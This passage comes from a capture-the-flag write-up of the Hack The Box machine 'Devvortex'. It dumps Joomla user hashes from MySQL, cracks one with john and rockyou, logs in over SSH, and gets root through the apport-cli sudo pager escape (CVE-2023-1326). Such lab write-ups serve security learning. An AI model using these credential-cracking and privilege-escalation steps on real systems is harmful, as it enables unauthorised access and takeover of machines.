| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-06-01 14:58:10 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql> select username, password from sd4fg_users;
select username, password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> exit
exit
Bye
```
{% endraw %}

<br />
Save the logan credentials to a file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (logan)     
1g 0:00:00:07 DONE (2025-06-02 01:07) 0.1254g/s 176.1p/s 176.1c/s 176.1C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Ssh into the machine with the Logan credentials.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ ssh logan@10.10.11.242
logan@10.10.11.242's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 01 Jun 2025 03:07:45 PM UTC

  System load:  0.0               Processes:             169
  Usage of /:   63.7% of 4.76GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$
```
{% endraw %}

<br />
Run sudo -l to get a list of commands that we can run as sudo.

{% raw %}
```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
{% endraw %}

<br />
Google apport-cli and come up with CVE-2023-1326.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/errorcve.png" title="apport-cli CVE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Follow the steps listed in the Medium article and get root.

{% raw %}
```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

.dpkg-query: no packages found matching xorg
...................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): B
What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
# whoami
root
# se choose (S/V/K/I/C): B
What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
# whoami
root
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
# cat /home/logan/user.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:0b:cf brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.242/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:0b:cf brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.242/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that, we quelled the devnado that is devvortex!  I hope you enjoyed the read.  See you in the next one.